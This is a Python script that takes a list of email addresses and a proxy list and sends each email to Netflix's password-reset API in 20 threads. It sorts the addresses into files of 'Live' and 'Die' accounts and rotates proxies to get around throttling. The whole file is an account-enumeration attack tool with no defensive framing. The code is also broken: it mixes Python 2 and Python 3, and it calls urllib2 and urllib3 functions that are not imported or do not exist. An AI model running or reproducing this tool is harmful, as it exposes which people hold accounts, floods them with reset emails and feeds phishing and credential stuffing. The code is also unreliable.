import json
import threading
import Queue
import time 
import urllib3, socket
import sys, re
import random
import urllib
import requests
import time

socket.setdefaulttimeout(13)

sys.tracebacklimit = 0

target_post = "https://www.netflix.com/api/shakti/adc049f7/login/help"

threads  = 20

resume = None 

def build_wordlist():

    fd = open(lis,"rb")

    raw_words = fd.readlines()

    fd.close()

    found_resume = False

    words = Queue.Queue()

    for word in raw_words:

        word = word.rstrip()

        if resume is not None:

            if found_resume:

                words.put(word)

            else:

                if word == resume:

                    found_resume = True

                    print(f'Resuming wordlist from: {resume}')

        else:

            words.put(word)

    return words

def check(email,pro):    

    try:             

        proxy_handler = urllib2.ProxyHandler({'https': pro})        

        opener = urllib3.build_opener(proxy_handler)

        urllib3.install_opener(opener)     

        post={"fields":{"forgotPasswordChoice":{"value":"email"},"email":email},"mode":"enterPasswordReset","action":"nextAction","authURL":""}

        login_data = json.dumps(post)

        req=urllib3.Request(target_post, data=login_data,headers={'Content-Type': 'application/json'})

        sock=urllib3.urlopen(req)

        a=sock.read()

        if "confirmPasswordResetEmailed" in a:

            print(f'Live =========> {email}')

            open('netflix_Live.txt',"a").write(email+'\n')

            return 0

        elif "account_not_found" in a:

            print(f'Die =====> =========> {email}')

            open('netflix_Die.txt',"a").write(email+'\n')

            return 0

        elif "throttling_failure" in a:

            return 1    

        else:

            return 1

    except Exception as e:

        return 1       

def dir_bruter(word_queue):

    dielist=[]

    while not word_queue.empty():

        email = word_queue.get()

        code=None

        while code !=0:

            pro=random.choice(prox)[0:-1]

            if pro not in dielist:

                code=check(email,pro)

                if code == 1:

                    dielist.append(pro)

lis=input('Name of mailist file: ')

proxylist=input('Name of proxylist file: ')

prox=open(proxylist,"r").readlines()

word_queue = build_wordlist()

for i in range(threads):

    t = threading.Thread(target=dir_bruter,args=(word_queue,))

    t.start()